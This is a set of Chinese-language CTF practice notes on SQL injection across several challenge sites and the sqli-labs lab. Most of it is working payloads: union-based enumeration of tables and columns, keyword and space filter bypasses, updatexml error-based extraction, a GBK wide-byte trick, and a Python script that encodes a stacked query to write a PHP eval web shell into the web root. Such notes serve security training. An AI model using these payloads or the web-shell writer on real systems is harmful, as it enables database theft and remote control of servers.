# SQL做题记录

## ichunqiu

#### *WEB SQL 50PT*

过滤order select

<>绕过

```
表名：
id=1%20union%20sel<>ect%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27sqli%27%20%23
列名：
id=1%20union%20sel<>ect%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27info%27%20%23
payload：
id=1%20union%20sel<>ect%201,flAg_T5ZNdrm,3%20from%20info%23
```



## BUGKU

#### *成绩单查询*

```
0' union select 1,2,3,4#
0' union select 1,database(),3,4#		skctf_flag
0' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='skctf_flag'#				fl4g,sc
0' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='fl4g'#					  skctf_flag
payload:
0' union select 1,skctf_flag,3,4 from fl4g#
```



## 安恒杯

#### *write a shell*

```mysql
mysql> SET @A="SELECT database()";
Query OK, 0 rows affected (0.00 sec)

mysql> PREPARE st FROM  @A;
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> EXECUTE st;
+------------+
| database() |
+------------+
| WEB        |
+------------+
```

#####  *mysqli_multi_query* 特殊函数

可以多行注入，用到execute语句

payload：

```python
import requests 

Query0 = "SET ^a="
# Query1_raw = "SELECT GRANTEE,PRIVILEGE_TYPE,3,4,IS_GRANTABLE FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE='FILE'"
# Query1_raw = "show variables like '%secure_file_priv%'"
Query1_raw = "SELECT '<?php eval($_POST['h']);?>' into outfile '/var/www/html/favicon/shaobao.php'"
Query1_pass_waf = "concat({})"
Query2 = ";PREPARE st from ^a;EXECUTE st;"

tmp_str = ""
for i in Query1_raw:
    tmp_str+="CHAR({}),".format(ord(i))

print(Query0+Query1_pass_waf.format(tmp_str[0:-1])+Query2)
```

#### *ezsql*

load_file





### SQL-LABS

#### *Less-5*

### 报错注入

#### <font color=green>*updatexml*</font>



```
1' and updatexml(null,concat(0x3a,([YOUR QUERY])),null)--
```



爆当前数据库：

```
1' and updatexml(null,concat(0x3a,(database())),null)--
```

爆表：
```
1' and updatexml(null,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),null)%23
```

爆列：

```
1' and updatexml(null,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name='emails')),null)%23
```

爆值

```
1' and updatexml(null,concat(0x3a,(select group_concat(id) from emails)),null)%23
```

### 安恒杯1月

```
polygon 报错
```

```
select * from flask where 1 and polygon(列名)
```

### NJUCTF-2018 滴！晨跑打卡
```
(preg_match("/[\s#*-]+/",$id))
```
过滤了空格，注释符`#-`
参考：https://lyiang.wordpress.com/2015/05/19/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A%E7%AC%A6/
过滤空格，参考https://lyiang.wordpress.com/2015/05/31/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E6%B3%A8%E5%85%A5/

注释符过滤可以构造恒真语句，再单引号闭合
```
SELECT * FROM users WHERE id='1' union select database(),1,1,1 and '1'='1'
```

空格使用`%a0`绕过

构造：
```
id=1'%a0union%a0select%a0database(),1,1,1%a0and%a0'1'='1'
```


## CG-CTF gbk-injection
http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1

```
0%df' union select 1,2#
```

爆列名单引号被过滤，使用16进制
```
select hex('gbksqli');
```

